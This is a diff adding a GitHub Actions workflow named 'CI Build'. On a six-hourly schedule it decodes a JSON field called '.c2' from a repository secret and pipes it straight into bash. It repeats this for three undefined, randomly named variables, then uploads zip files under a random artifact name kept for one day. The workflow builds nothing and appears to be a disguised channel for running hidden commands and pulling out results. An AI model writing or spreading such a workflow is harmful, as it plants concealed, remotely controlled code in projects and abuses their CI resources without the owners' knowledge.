@@ -1,0 +1,36 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          yufks44: ${{ secrets.yufks44 }}
+        run: |
+          printf '%s' "$yufks44" | jq -r .c2 | /bin/bash
+          printf '%s' "$iffmy77" | jq -r .ocm5 | /bin/bash
+          echo $i8753 | jq -r .pag70134 | /bin/bash
+          printf '%s' "$kta1" | jq -r .h3385 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Dljj3JyN
+          path: "*.zip"
+          retention-days: 1
